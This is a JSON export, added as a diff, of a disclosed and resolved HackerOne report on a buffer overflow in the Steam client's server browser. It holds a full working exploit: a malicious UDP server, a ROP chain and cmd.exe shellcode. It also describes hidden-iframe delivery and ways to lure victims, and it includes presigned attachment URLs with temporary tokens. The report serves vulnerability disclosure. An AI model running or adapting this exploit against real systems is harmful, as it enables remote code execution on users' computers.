@@ -1,0 +1,183 @@
+{
+  "id": 470520,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NzA1MjA=",
+  "url": "https://hackerone.com/reports/470520",
+  "title": "RCE on Steam Client via buffer overflow in Server Info",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2018-12-21T08:51:43.941Z",
+  "submitted_at": "2018-12-21T08:51:43.941Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "vinnievan",
+    "url": "/vinnievan",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23363,
+    "url": "https://hackerone.com/valve",
+    "handle": "valve",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/363/c78d46a7d0ea39e3a15a7c19c1a48634f2571eb9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/363/c78d46a7d0ea39e3a15a7c19c1a48634f2571eb9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Valve",
+      "twitter_handle": "",
+      "website": "https://www.valvesoftware.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2019-03-15T19:47:43.463Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-03-09T17:04:06.719Z",
+  "team_member_agreed_on_going_public_at": "2019-03-15T19:47:43.353Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Introduction\n\nIn Steam and other valve games (CSGO, Half-Life, TF2) there is a functionality to find game servers called the server browser. In order to retrieve the information about these servers the server browser communicates with a specific UDP protocol called [server queries](https://developer.valvesoftware.com/wiki/Server_queries). The protocol is well described in the online developers manual of Steam. We implemented a custom python server which only replies with the protocol using the same information available in the documentation. After a successful implementation of the protocol we fuzzed several parameters and noticed that the Steam client crashed when receiving replies from our custom server. More specifically, the client crashed when we replied with a large player name used in the `A2S_PLAYER` response. When attaching a debugger we noticed it crashed due to a stack-based buffer overflow.\n\nThis clearly indicates that something was wrong and we investigated it further to be able to exploit the buffer overflow. After further inspection, we noticed that the overflow occurred in the `serverbrowser` library. At some point the players’ name is converted into unicode and an overflow occurs because the boundaries are not checked. Also, there’s no canary protection present, which allowed us to overwrite the return address and execute arbitrary code on Windows.\n\n## Exploit details\n\nWe wanted to prove impact and build an exploit. First, we tested it on Linux and we were able to control the execution flow instantly by overwriting the return address. However, on Linux, we were able to control two bytes of the `EIP` register only (e.g. `0x00004141`) and we didn’t explore it further. On OSX, the process terminated with `SIGABRT`, which means that there’s probably a canary protection in the library on OSX. Then, we tried to exploit it on Windows and we were successful (tested on Windows 8.1 and 10).\n\nOn Windows, sending a player name via UDP like `A*1100` would result in the following stack layout:\n```\n0x00410041\n0x00410041\n...\n```\n\nThis happens due to unicode conversion (wide-char), because player names can use unicode characters. Sending a player name with unicode characters like `u\"\\u4141\"*1100` would result in the following layout:\n```\n0x41414141\n0x41414141\n...\n```\n\nHowever, since we were corrupting the stack and registers before the function returns, we had no control over the `EIP` register yet. The program was crashing after dereferencing the `edi` register, but we had control over it. We satisfied these special conditions using constant values present on the `Steam.exe` binary:\n\n{F395516}\n\nThen, we built a unicode ROP chain with gadgets from `Steam.exe` only, to call `VirtualProtect` dynamically to make the stack executable and jump to our unicode shellcode to execute `cmd.exe`. This was a big challenge since we couldn't use values like `0x00000040` in our ROP chain, otherwise the string would be terminated. And we couldn't use invalid unicode characters like `u\"\\uda01\"` because the library replaces them with a question mark `?` - `0x003F`.\n\n**Note:** Everything is calculated using the `Steam.exe` base address. This address changes if you restart your Windows 8 or Windows 10, not if you relaunch Steam. The exploit is 100% reliable if you edit the base address on the exploit, but you can't predict the base address in the computer of a victim due to ASLR. However, we have two exploitation scenarios:\n\n- Only 9 bits are randomized: An attacker can successfully exploit a victim with a probability of 0.2% (1/512), which is more than enough if we are talking about an attacker distributing this exploit massively to all Steam users (1 new victim every 512 attempts in average)\n- This vulnerability can be chained with another memory leak vulnerability to make it 100% reliable\n\n## Steps to reproduce\n\nFirst, make sure that you have Steam installed. If you are using the beta version, please uncomment the beta version gadgets in the exploit code.\n\n1 - Download the attachment: {F395515}\n2 - Use a debugger like Immunity Debugger and attach to Steam.exe\n3 - Grab the base address of `Steam.exe` (View > Executable modules) and edit the `STEAM_BASE` variable on `steam_serverinfo_exploit.py` to make the exploit 100% reliable\n{F395520}\n\n4 - Run the exploit on a server of your choice (e.g. localhost): `python steam_serverinfo_exploit.py`\n5 - Edit `POC.html` and change the IP address of the server in the `iframe src`\n6 - Open it in a browser and wait for `cmd.exe` to be executed\n7 - You can also open the server browser in the menu (View > Servers) and click `View server info` to trigger the exploit (if you are running the server in the same network it will appear in the LAN section)\n\n## PoC\n\n{F395517}\n**Steamclient_POC_Windows10.mp4**: Contains a video of the exploit being triggered on Windows 10 via manual interaction with the Steam server browser\n\n{F395518}\n**SteamURL_POC_Windows10.mp4**: Contains a video of the exploit being triggered on Windows 10 via a malicious web page containing a hidden iframe that will trigger the exploit automatically. In the video, Steam was not running when visiting the malicious page and it was automatically started. This also works when Steam is already running.\n\n{F395519}\nContains the html page code used in the SteamURL video.\n\n**Exploit code:**\n\n```python\nimport logging\nimport socket\nimport textwrap\n\n\n### Exploit for Server Info - Player Name buffer overflow (Steam.exe - Windows 8 and 10) #######\n# More info: https://developer.valvesoftware.com/wiki/Server_queries\n# Shellcode must contain valid unicode characters, pad with NOPs :)\n\n\nSTEAM_BASE = 0x01180000\n\n# Shellcode: open cmd.exe\nshellcode = \"\\x31\\xc9\\x64\\x8b\\x41\\x30\\x8b\\x40\\x0c\\x8b\\x70\\x14\\xad\\x96\\xad\\x8b\\x58\\x10\\x8b\\x53\\x3c\\x01\\xda\\x90\\x8b\\x52\\x78\\x01\\xda\\x8b\\x72\\x20\\x90\\x01\\xde\\x31\\xc9\\x41\\xad\\x01\\xd8\\x81\\x38\\x47\\x65\\x74\\x50\\x75\\xf4\\x81\\x78\\x04\\x72\\x6f\\x63\\x41\\x75\\xeb\\x81\\x78\\x08\\x64\\x64\\x72\\x65\\x75\\xe2\\x8b\\x72\\x24\\x90\\x01\\xde\\x66\\x8b\\x0c\\x4e\\x49\\x8b\\x72\\x1c\\x01\\xde\\x8b\\x14\\x8e\\x90\\x01\\xda\\x31\\xf6\\x89\\xd6\\x31\\xff\\x89\\xdf\\x31\\xc9\\x51\\x68\\x61\\x72\\x79\\x41\\x68\\x4c\\x69\\x62\\x72\\x68\\x4c\\x6f\\x61\\x64\\x54\\x53\\xff\\xd2\\x83\\xc4\\x0c\\x31\\xc9\\x68\\x65\\x73\\x73\\x42\\x88\\x4c\\x24\\x03\\x68\\x50\\x72\\x6f\\x63\\x68\\x45\\x78\\x69\\x74\\x54\\x57\\x31\\xff\\x89\\xc7\\xff\\xd6\\x83\\xc4\\x0c\\x31\\xc9\\x51\\x68\\x64\\x6c\\x6c\\x41\\x88\\x4c\\x24\\x03\\x68\\x6c\\x33\\x32\\x2e\\x68\\x73\\x68\\x65\\x6c\\x54\\x31\\xd2\\x89\\xfa\\x89\\xc7\\xff\\xd2\\x83\\xc4\\x0b\\x31\\xc9\\x68\\x41\\x42\\x42\\x42\\x88\\x4c\\x24\\x01\\x68\\x63\\x75\\x74\\x65\\x68\\x6c\\x45\\x78\\x65\\x68\\x53\\x68\\x65\\x6c\\x54\\x50\\xff\\xd6\\x83\\xc4\\x0d\\x31\\xc9\\x68\\x65\\x78\\x65\\x41\\x88\\x4c\\x24\\x03\\x68\\x63\\x6d\\x64\\x2e\\x54\\x59\\x31\\xd2\\x42\\x52\\x31\\xd2\\x52\\x52\\x51\\x52\\x52\\xff\\xd0\\xff\\xd7\"\n\n\ndef udp_server(host=\"0.0.0.0\", port=27015):\n    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    print(\"[*] Starting TSQuery UDP server on host: %s and port: %s\" % (host, port))\n    s.bind((host, port))\n    while True:\n        (data, addr) = s.recvfrom(128*1024)\n        requestType = checkRequestType(data)\n        if requestType == \"INFO\":\n            response = createINFOReply()\n        elif requestType == \"PLAYER\":\n            response = createPLAYERReply()\n            print(\"[+] Payload sent!\")\n        else:\n            response = 'nope'\n        s.sendto(response,addr)\n        yield data\n\n\ndef checkRequestType(data):\n    # Header byte contains the type of request\n    header = data[4]\n    if header == \"\\x54\":\n        print(\"[*] Received A2S_INFO request\")\n        return \"INFO\"\n    elif header == \"\\x55\":\n        print(\"[*] Received A2S_PLAYER request\")\n        return \"PLAYER\"\n    else:\n        print \"Unknown request\"\n        return \"UNKNOWN\"\n\n\ndef createINFOReply():\n    # A2S_INFO response\n    # Retrieves information about the server including, but not limited to: its name, the map currently being played, and the number of players.\n    pre = \"\\xFF\\xFF\\xFF\\xFF\"                         # Pre (4 bytes)\n    header = \"\\x49\"                                  # Header (1 byte)\n    protocol = \"\\x02\"                                # Protocol version (1 byte)\n    name = \"@Kernelpanic and @0xacb Server\" + \"\\x00\" # Server name (string)\n    map_name = \"de_dust2\" + \"\\x00\" # Map name (string)\n    folder = \"csgo\" + \"\\x00\" # Name of the folder contianing the game files (string)\n    game = \"Counter-Strike: Global Offensive\" + \"\\x00\" # Game name (string)\n    ID = \"\\xda\\x02\" # Game ID (short)\n    players = \"\\xFF\" # Amount of players in the server (byte)\n    maxplayers = \"\\xFF\" # Max player allowed (byte)\n    bots = \"\\x00\" # Bots in game (byte)\n    server_type = \"d\" # Server type, d = dedicate (byte)\n    environment = \"l\" # Hosted on windows linux or mac, l is linux (byte)\n    visibility = \"\\x00\" # Password needed? (byte)\n    VAC = \"\\x01\" # VAC enabled? (byte)\n    version = \"1.3.6.7.1\\x00\"\n    return pre + header + protocol + name + map_name + folder + game + ID + players + maxplayers + bots + server_type + environment + visibility + VAC + version\n\n\ndef to_unicode(addr):\n    a = addr & 0xffff;\n    b = addr >> 16;\n    return eval('u\"\\\\u%s\\\\u%s\"' % (hex(a)[2:].zfill(4), hex(b)[2:].zfill(4)))\n\n\ndef convert_addr(gadget):\n    return to_unicode(STEAM_BASE + gadget - 0x400000)\n\n\ndef convert_shellcode(code):\n    code = code + \"\\x90\"*8 #pad with nops\n    output = \"\"\n    l = textwrap.wrap(code.encode(\"hex\"), 2)\n    for i in range(0, len(l)-4, 4):\n        output += \"\\\\u%s%s\\\\u%s%s\" % (l[i+1], l[i], l[i+3], l[i+2])\n    return eval('u\"%s\"' % output)\n\n\ndef pwn():\n    print(\"[*] Building ROP chain\")\n\n    # ROP gadgets for Steam.exe Nov 26 2018\n    pop_eax = convert_addr(0x503ca7)\n    pop_ecx = convert_addr(0x41bd9f)\n    pop_edx = convert_addr(0x413a53)\n    pop_ebx = convert_addr(0x40511c)\n    pop_ebp = convert_addr(0x40247c)\n    pop_esi = convert_addr(0x404de6)\n    pop_edi = convert_addr(0x423839)\n    jmp_esp = convert_addr(0x4413bd)\n    pushad = convert_addr(0x425e00)\n    ret_nop = convert_addr(0x401212)\n    mov_edx_eax = convert_addr(0x5599a6)\n    sub_eax_41e82c6a = convert_addr(0x51584f)\n    mov_ebx_ecx_mov_ecx_eax_mov_eax_esi_pop_esi_ret = convert_addr(0x4e24eb)\n    mov_esi_ptr_esi_mov_eax_esi_pop_esi = convert_addr(0x4506ea)\n    xchg_eax_esi = convert_addr(0x543b86)\n\n    writable_addr = convert_addr(0x69a01c)\n    virtual_protect_idata = convert_addr(0x5f9280)\n    new_protect = to_unicode(0x41e82c6a+0x40)\n    msize = to_unicode(0x41e82c6a+0x501)\n\n    '''\n    # ROP gadgets for Steam.exe Beta Dec 14 2018\n    pop_eax = convert_addr(0x425993)\n    pop_ecx = convert_addr(0x41bd9f)\n    pop_edx = convert_addr(0x413a53)\n    pop_ebx = convert_addr(0x40511c)\n    pop_ebp = convert_addr(0x40247c)\n    pop_esi = convert_addr(0x404de6)\n    pop_edi = convert_addr(0x423839)\n    jmp_esp = convert_addr(0x4413bd)\n    pushad = convert_addr(0x425e00)\n    ret_nop = convert_addr(0x401212)\n    mov_edx_eax = convert_addr(0x559d46)\n    sub_eax_31e82c6a = convert_addr(0x515bbf)\n    mov_ebx_ecx_mov_ecx_eax_mov_eax_esi_pop_esi_ret = convert_addr(0x4e284b)\n    mov_esi_ptr_esi_mov_eax_esi_pop_esi = convert_addr(0x4506ea)\n    xchg_eax_esi = convert_addr(0x515b5e)\n\n    writable_addr = convert_addr(0x69a01c)\n    virtual_protect_idata = convert_addr(0x5fa280)\n    new_protect = to_unicode(0x31e82c6a+0x40)\n    msize = to_unicode(0x31e82c6a+0x501)\n    '''\n\n    rop = pop_eax + msize + sub_eax_41e82c6a + mov_ebx_ecx_mov_ecx_eax_mov_eax_esi_pop_esi_ret \\\n              + u\"\\ub33f\\ubeef\" + mov_ebx_ecx_mov_ecx_eax_mov_eax_esi_pop_esi_ret + ret_nop*0x10 \\\n              + pop_ecx + writable_addr \\\n              + pop_eax + new_protect + sub_eax_41e82c6a + mov_edx_eax \\\n              + pop_ebp + jmp_esp + pop_esi + virtual_protect_idata \\\n              + mov_esi_ptr_esi_mov_eax_esi_pop_esi + u\"\\ub33f\\ubeef\" + xchg_eax_esi + pop_edi \\\n              + ret_nop + pop_eax + u\"\\u9090\\u9090\" + pushad\n\n    #special conditions to avoid crashes\n    special_condition_1 = to_unicode(STEAM_BASE + 0x10)\n    special_condition_2 = to_unicode(STEAM_BASE + 0x11)\n    payload = \"A\"*1024 + u\"\\ub33f\\ubeef\"*12 + special_condition_1 + special_condition_2*31 + rop + shellcode\n    return payload.encode(\"utf-8\") + \"\\x00\"\n\n\ndef createPLAYERReply():\n    # A2S_player response\n    # This query retrieves information about the players currently on the server.\n    pre = \"\\xFF\\xFF\\xFF\\xFF\"                        # Pre (4 bytes)\n    header = \"\\x44\"                                 # Header (1 byte)\n    players = \"\\x01\"                                # Amount of players (1 byte)\n    indexPlayer1 = \"\\x01\"                           # Index of player (1 byte)\n\n    namePlayer2 = pwn()\n    scorePlayer2 = \"\"\n    durationPlayer2  = \"\"\n    return pre + header + players + indexPlayer1 + namePlayer2 + scorePlayer2 + durationPlayer2\n\n\nFORMAT_CONS = '%(asctime)s %(name)-12s %(levelname)8s\\t%(message)s'\nlogging.basicConfig(level=logging.DEBUG, format=FORMAT_CONS)\n\nif __name__ == \"__main__\":\n    shellcode = convert_shellcode(shellcode)\n    for data in udp_server():\n        pass\n```\n\n## Impact\n\nAn attacker can execute arbitrary code on the computer of any Steam user who views the server info of our malicious server. Usually an attacker would initiate a backdoor connection to a C2 infrastructure to gain access to the computer of the victim. From there on an attacker could do whatever he/she wants (e.g. account takeover, steal all items from the steam account, install additional malware in the OS, exfiltrate documents, etc.)\n\nThere are several ways to trick a user into running the exploit:\n- User views the Server Info in the Steam client server browser\n- User visits a malicious web page of an attacker where a [Steam browser protocol](https://developer.valvesoftware.com/wiki/Steam_browser_protocol) request is initiated: `steam://connect/1.2.3.4`\n\nAdditionally there are a few ways that increase the likelihood of this attack:\n- It can be triggered via a website using the steam browser protocol\n- Lots of users don’t need to click the `Open Steam` button on the browser (Always open these types of links in the associated app ✓)\n- The first Info Reply that doesn’t contain the exploit can have interesting values to trick the user. \n  - The server name can be chosen and can trick the user to use the server\n  - By setting the current amount of players high people are more likely to join\n  - Map name could also contain interesting text as values to lure people\n  - If the amount of players in the server is equal the maximum allowed players in the server then the server info box is automatically opened and the exploit executes successfully after the first automatic refresh\n\nBest regards,\nVinnie Vanhoecke @vinnievan and André Baptista @0xacb",
+  "weakness": {
+    "id": 3,
+    "name": "Classic Buffer Overflow"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 395515,
+      "file_name": "steam_serverinfo_exploit.py",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/395/515/d0678ca100f35dec0997c71f22bea8a4f3f03427/steam_serverinfo_exploit.py?response-content-disposition=attachment%3B%20filename%3D%22steam_serverinfo_exploit.py%22%3B%20filename%2A%3DUTF-8%27%27steam_serverinfo_exploit.py&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTB3JEE33%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152256Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJIMEYCIQDnoluxawIPPNMQONkmV4bnr0Mbqh2o%2FoDMn34GDtFlOgIhAIHpNKfOsXjqgrjQOtEkx2paaZiFL5023Gdlp5MkSmzyKroFCOj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzxy1%2FdWHR5D%2Bdt69IqjgUNb1mkoGBX%2BhlyT2Eb%2Fs4ZUq4qxKolZuiC2P88H1RxtAOU12rDyB80MQd8k4XmGwPbDJts6kjdL2MnBtsvXEl6%2Bq9ZQdCg9kEFE4tSbvKtSny%2BiswN38ke3djOgn0h5rKDdf%2BmFQ4KOGj3x%2Be9AMVihBjY1UZtR1nrsvZlLiSnCbGDOfbk2AHtmuYZ0s1q0XiHUB4xSqaleXajj26HynmWY%2Bgn24Cnp25R9UOCBp9HF9eyp3%2FjqqGRv8HJZjo9FqV%2BtyK7HjqC783M1JxFTMozs2xqsLPt1pwVDtNp62ARw4ohnSzeYaVfVqNVWlKv1SIRH%2BmscSz6bGVQrJ%2Bldi3GFyS%2FG2%2B82gMtrCmNNBYxl4S1rVm4WYbrTCHWCxHHxLAmOT%2B0YP05x1EPALNnUtFF55yUgsvjKfPY9E3imxss0QTI%2B%2F3q490hHnn7FVLJxU9AXZNYTnysRChL8fDf18d7%2BmilElqpZs%2BbBc1r1EOLksdwfUslMuNnE3R8hQaiMwPs6JTEZZ1NuhYQxPvL1Djcc4Ol6SjwyyKC%2BletqsGRra4Ls%2BpvgZKI7qNX3VGtJ%2BiRlZyeiD%2BLq%2BQ8kAG0kRRHDvqSgTCtdF6%2FMBECZ5FcP8jNNwzgNfCXgzO%2Be5z9xsvGGGdqFBKcSH%2FgR%2Fb3H8IqzeFnFgWR%2BL5f9MTyORUaC3Ezbm3eA5nTZv40fhXer20DKiTEkwu5JQtoijnshXiCTnDXD4RyiydvJ1SBcNlXqLCzbmE7FvnYd1bE5D2p8g4sKkNHvRJyPiv6MNcCr7TVR81u0io49NPJ%2FX5dtc%2BhuTkK76DiUZOP9qJKZl%2FSPH%2B%2BFEmg8HK7PtMquco%2BeNf26ka4%2BvvxvaqNfQdgdX4w85z9zwY6sAGDr%2BpzYGYl8z7Ow4OKP6Zugtla4ifd%2BVXXZ6lQOIJQc4VuRbAm85TxSIcwg3pmEAY2XL4QiY%2Bd1McmOKKOHq0orlS%2BHrJk47yNkzrWsiD5sTa4WG0t6O8IeQ10ecfUwIz3QzXGA%2B9%2FT8Uitwck6v85Adw99V5yTGpsFcfLTQL2U2wJlqdBXf60ISEbMDaTvHSK7KGSDRmR3WdCwcahbP02%2F8rHTll7MyHjLZBKZ%2FJcxQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9a75e6fb6d8a2e1754173e9621c0aa14073fa6eab0785dc1dad4b854d4835f5b",
+      "file_size": 7400,
+      "type": "text/plain",
+      "moderated": null
+    },
+    {
+      "id": 395516,
+      "file_name": "special_condition.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/395/516/c8f7444bdc7ca233ec1436d373188d567b3cdb49/special_condition.png?response-content-disposition=attachment%3B%20filename%3D%22special_condition.png%22%3B%20filename%2A%3DUTF-8%27%27special_condition.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTB3JEE33%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152256Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJIMEYCIQDnoluxawIPPNMQONkmV4bnr0Mbqh2o%2FoDMn34GDtFlOgIhAIHpNKfOsXjqgrjQOtEkx2paaZiFL5023Gdlp5MkSmzyKroFCOj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzxy1%2FdWHR5D%2Bdt69IqjgUNb1mkoGBX%2BhlyT2Eb%2Fs4ZUq4qxKolZuiC2P88H1RxtAOU12rDyB80MQd8k4XmGwPbDJts6kjdL2MnBtsvXEl6%2Bq9ZQdCg9kEFE4tSbvKtSny%2BiswN38ke3djOgn0h5rKDdf%2BmFQ4KOGj3x%2Be9AMVihBjY1UZtR1nrsvZlLiSnCbGDOfbk2AHtmuYZ0s1q0XiHUB4xSqaleXajj26HynmWY%2Bgn24Cnp25R9UOCBp9HF9eyp3%2FjqqGRv8HJZjo9FqV%2BtyK7HjqC783M1JxFTMozs2xqsLPt1pwVDtNp62ARw4ohnSzeYaVfVqNVWlKv1SIRH%2BmscSz6bGVQrJ%2Bldi3GFyS%2FG2%2B82gMtrCmNNBYxl4S1rVm4WYbrTCHWCxHHxLAmOT%2B0YP05x1EPALNnUtFF55yUgsvjKfPY9E3imxss0QTI%2B%2F3q490hHnn7FVLJxU9AXZNYTnysRChL8fDf18d7%2BmilElqpZs%2BbBc1r1EOLksdwfUslMuNnE3R8hQaiMwPs6JTEZZ1NuhYQxPvL1Djcc4Ol6SjwyyKC%2BletqsGRra4Ls%2BpvgZKI7qNX3VGtJ%2BiRlZyeiD%2BLq%2BQ8kAG0kRRHDvqSgTCtdF6%2FMBECZ5FcP8jNNwzgNfCXgzO%2Be5z9xsvGGGdqFBKcSH%2FgR%2Fb3H8IqzeFnFgWR%2BL5f9MTyORUaC3Ezbm3eA5nTZv40fhXer20DKiTEkwu5JQtoijnshXiCTnDXD4RyiydvJ1SBcNlXqLCzbmE7FvnYd1bE5D2p8g4sKkNHvRJyPiv6MNcCr7TVR81u0io49NPJ%2FX5dtc%2BhuTkK76DiUZOP9qJKZl%2FSPH%2B%2BFEmg8HK7PtMquco%2BeNf26ka4%2BvvxvaqNfQdgdX4w85z9zwY6sAGDr%2BpzYGYl8z7Ow4OKP6Zugtla4ifd%2BVXXZ6lQOIJQc4VuRbAm85TxSIcwg3pmEAY2XL4QiY%2Bd1McmOKKOHq0orlS%2BHrJk47yNkzrWsiD5sTa4WG0t6O8IeQ10ecfUwIz3QzXGA%2B9%2FT8Uitwck6v85Adw99V5yTGpsFcfLTQL2U2wJlqdBXf60ISEbMDaTvHSK7KGSDRmR3WdCwcahbP02%2F8rHTll7MyHjLZBKZ%2FJcxQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d7481e84de8e2121d32b1e2269a33a4d54aadef6bff302fa0aeb1e6f42bca1e5",
+      "file_size": 212572,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 395517,
+      "file_name": "Steamclient_POC_Windows10.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/395/517/d0f5dd96fe302547c863024a51930f428e4e39ae/Steamclient_POC_Windows10.mp4?response-content-disposition=attachment%3B%20filename%3D%22Steamclient_POC_Windows10.mp4%22%3B%20filename%2A%3DUTF-8%27%27Steamclient_POC_Windows10.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTB3JEE33%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152256Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJIMEYCIQDnoluxawIPPNMQONkmV4bnr0Mbqh2o%2FoDMn34GDtFlOgIhAIHpNKfOsXjqgrjQOtEkx2paaZiFL5023Gdlp5MkSmzyKroFCOj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzxy1%2FdWHR5D%2Bdt69IqjgUNb1mkoGBX%2BhlyT2Eb%2Fs4ZUq4qxKolZuiC2P88H1RxtAOU12rDyB80MQd8k4XmGwPbDJts6kjdL2MnBtsvXEl6%2Bq9ZQdCg9kEFE4tSbvKtSny%2BiswN38ke3djOgn0h5rKDdf%2BmFQ4KOGj3x%2Be9AMVihBjY1UZtR1nrsvZlLiSnCbGDOfbk2AHtmuYZ0s1q0XiHUB4xSqaleXajj26HynmWY%2Bgn24Cnp25R9UOCBp9HF9eyp3%2FjqqGRv8HJZjo9FqV%2BtyK7HjqC783M1JxFTMozs2xqsLPt1pwVDtNp62ARw4ohnSzeYaVfVqNVWlKv1SIRH%2BmscSz6bGVQrJ%2Bldi3GFyS%2FG2%2B82gMtrCmNNBYxl4S1rVm4WYbrTCHWCxHHxLAmOT%2B0YP05x1EPALNnUtFF55yUgsvjKfPY9E3imxss0QTI%2B%2F3q490hHnn7FVLJxU9AXZNYTnysRChL8fDf18d7%2BmilElqpZs%2BbBc1r1EOLksdwfUslMuNnE3R8hQaiMwPs6JTEZZ1NuhYQxPvL1Djcc4Ol6SjwyyKC%2BletqsGRra4Ls%2BpvgZKI7qNX3VGtJ%2BiRlZyeiD%2BLq%2BQ8kAG0kRRHDvqSgTCtdF6%2FMBECZ5FcP8jNNwzgNfCXgzO%2Be5z9xsvGGGdqFBKcSH%2FgR%2Fb3H8IqzeFnFgWR%2BL5f9MTyORUaC3Ezbm3eA5nTZv40fhXer20DKiTEkwu5JQtoijnshXiCTnDXD4RyiydvJ1SBcNlXqLCzbmE7FvnYd1bE5D2p8g4sKkNHvRJyPiv6MNcCr7TVR81u0io49NPJ%2FX5dtc%2BhuTkK76DiUZOP9qJKZl%2FSPH%2B%2BFEmg8HK7PtMquco%2BeNf26ka4%2BvvxvaqNfQdgdX4w85z9zwY6sAGDr%2BpzYGYl8z7Ow4OKP6Zugtla4ifd%2BVXXZ6lQOIJQc4VuRbAm85TxSIcwg3pmEAY2XL4QiY%2Bd1McmOKKOHq0orlS%2BHrJk47yNkzrWsiD5sTa4WG0t6O8IeQ10ecfUwIz3QzXGA%2B9%2FT8Uitwck6v85Adw99V5yTGpsFcfLTQL2U2wJlqdBXf60ISEbMDaTvHSK7KGSDRmR3WdCwcahbP02%2F8rHTll7MyHjLZBKZ%2FJcxQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3c6f9b157d97736c2b9bda0d3796db8a494e99db608fd550fdbf144bdf4a7b1e",
+      "file_size": 6094587,
+      "type": "video/mp4",
+      "moderated": null
+    },
+    {
+      "id": 395518,
+      "file_name": "SteamURL_POC_Windows10.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/395/518/da1df6c56a447afe9158ae17a29e07bc7c769aa3/SteamURL_POC_Windows10.mp4?response-content-disposition=attachment%3B%20filename%3D%22SteamURL_POC_Windows10.mp4%22%3B%20filename%2A%3DUTF-8%27%27SteamURL_POC_Windows10.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTB3JEE33%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152256Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJIMEYCIQDnoluxawIPPNMQONkmV4bnr0Mbqh2o%2FoDMn34GDtFlOgIhAIHpNKfOsXjqgrjQOtEkx2paaZiFL5023Gdlp5MkSmzyKroFCOj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzxy1%2FdWHR5D%2Bdt69IqjgUNb1mkoGBX%2BhlyT2Eb%2Fs4ZUq4qxKolZuiC2P88H1RxtAOU12rDyB80MQd8k4XmGwPbDJts6kjdL2MnBtsvXEl6%2Bq9ZQdCg9kEFE4tSbvKtSny%2BiswN38ke3djOgn0h5rKDdf%2BmFQ4KOGj3x%2Be9AMVihBjY1UZtR1nrsvZlLiSnCbGDOfbk2AHtmuYZ0s1q0XiHUB4xSqaleXajj26HynmWY%2Bgn24Cnp25R9UOCBp9HF9eyp3%2FjqqGRv8HJZjo9FqV%2BtyK7HjqC783M1JxFTMozs2xqsLPt1pwVDtNp62ARw4ohnSzeYaVfVqNVWlKv1SIRH%2BmscSz6bGVQrJ%2Bldi3GFyS%2FG2%2B82gMtrCmNNBYxl4S1rVm4WYbrTCHWCxHHxLAmOT%2B0YP05x1EPALNnUtFF55yUgsvjK